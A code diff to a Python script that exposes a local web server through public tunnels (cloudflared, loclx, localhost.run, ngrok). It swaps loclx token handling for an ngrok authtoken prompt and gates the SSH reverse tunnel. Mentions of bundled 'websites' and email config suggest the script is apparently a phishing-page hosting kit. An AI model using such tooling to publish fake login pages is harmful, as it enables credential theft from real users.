@@ -863,19 +863,21 @@ def pexit():
     exit(0)
 
 
-# Set up loclx authtoken to work with loclx links
-def lx_token():
-    global lx_command
+# Set up ngrok authtoken to work with ngrok links
+def ngr_token():
+    ngrok_token_file = f"{tunneler_dir}/ngrok_token"
     while True:
-        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
-        if not "error" in status:
+        if isfile(ngrok_token_file) and open(ngrok_token_file).read().strip():
             break
-        has_token = input(f"\n{ask}Do you have loclx access token? [y/N/help]: {green}")
+        has_token = input(f"\n{ask}Do you have ngrok authtoken? (https://dashboard.ngrok.com/get-started/your-authtoken) [y/N/help]: {green}")
         if has_token == "y":
-            shell(f"{lx_command} account login")
-            break
+            token_inp = input(f"\n{ask}Paste your ngrok authtoken > {green}").strip()
+            if token_inp:
+                with open(ngrok_token_file, "w") as ngr_tok_file:
+                    ngr_tok_file.write(token_inp)
+                break
         elif has_token == "help":
-            sprint(lx_help, 0.01)
+            print(f"\n{info2}Get your authtoken here: {green}https://dashboard.ngrok.com/get-started/your-authtoken{nc}")
             sleep(3)
         elif has_token in ["n", ""]:
             break
@@ -1287,7 +1289,7 @@ def requirements():
         extract("websites.zip", sites_dir)
         remove("websites.zip")
     if mode != "test":
-        lx_token()
+        ngr_token()
         ssh_key()
     email_config = cat(email_file)
     if is_json(email_config):
@@ -1469,10 +1471,11 @@ def server():
         arguments = f"{arguments} --subdomain {subdomain}"
     bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
     bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
-    if key:
-        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
-    else:
-        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    if tunneler.lower() in [ "localhostrun", "lhr" ]:
+        if key:
+            bgtask(f"ssh -R 80:{local_url} localhost.run -T -o BatchMode=yes -n", stdout=lhr_log, stderr=lhr_log)
+        else:
+            bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -o BatchMode=yes -n", stdout=lhr_log, stderr=lhr_log)
     ngrok_token_file = f"{tunneler_dir}/ngrok_token"
     if not isfile(ngrok_token_file):
         sprint(f"\n{ask}Paste your ngrok authtoken (https://dashboard.ngrok.com/get-started/your-authtoken) or press enter to skip > {green}")
